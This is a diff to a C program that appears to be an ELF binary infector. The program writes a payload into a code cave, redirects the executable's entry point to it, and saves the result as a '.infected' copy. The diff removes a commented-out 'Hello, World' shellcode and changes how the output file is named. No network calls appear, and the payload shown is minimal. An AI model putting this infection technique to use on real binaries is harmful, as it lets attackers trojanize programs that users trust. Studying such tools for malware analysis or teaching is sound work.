@@ -7,6 +7,7 @@
 
 #include <stdlib.h>
 #include <string.h>
+#include <libgen.h>
 
 #include <sys/mman.h>
 
@@ -14,19 +15,7 @@
 #include "mem_search.h"
 #include "file_map.h"
 #include "elf_map.h"
-
-// unsigned char shell_code[] = {
-//     0x52,                                       // push   %rdx
-//     0xb8, 0x01, 0x00, 0x00, 0x00,               // mov    $0x1,%eax
-//     0xbf, 0x01, 0x00, 0x00, 0x00,               // mov    $0x1,%edi
-//     0x48, 0x8d, 0x35, 0x11, 0x00, 0x00, 0x00,   // lea    0x11(%rip),%rsi
-//     0xba, 0x0e, 0x00, 0x00, 0x00,               // mov    $0xe,%edx
-//     0x0f, 0x05,                                 // syscall
-//     0x5a,                                       // pop    %rdx
-//     0x48, 0x8d, 0x05, 0xff, 0xff, 0xff, 0xff,   // lea    -0x1(%rip),%rax
-//     0xff, 0xe0,                                 // jmp    *%rax
-//     'H', 'e', 'l', 'l', 'o', ',', ' ', 'W', 'o', 'r', 'l', 'd', '!', '\n',
-// };
+#include "str_manip.h"
 
 uint8_t payload_prefix[] = {
     0x48, 0x8d, 0x05, 0xff, 0xff, 0xff, 0xff,   // lea  -0x1(%rip),%rax
@@ -125,7 +114,15 @@ int main(int argc, char* argv[]) {
     );
     elf_map.header->e_entry = code_cave - elf_map.start;
 
-    int out_fd = open("injected", O_CREAT | O_WRONLY, 0744);
+    char* out_file_name = str_join(basename(argv[1]), ".infected");
+    if (out_file_name == NULL) {
+        (void)munmap(map, map_size);
+        free(payload);
+        return (1);
+    }
+
+    int out_fd = open(out_file_name, O_CREAT | O_WRONLY, 0744);
+    free(out_file_name);
     if (out_fd != -1)
     {
         write(out_fd, map, map_size);
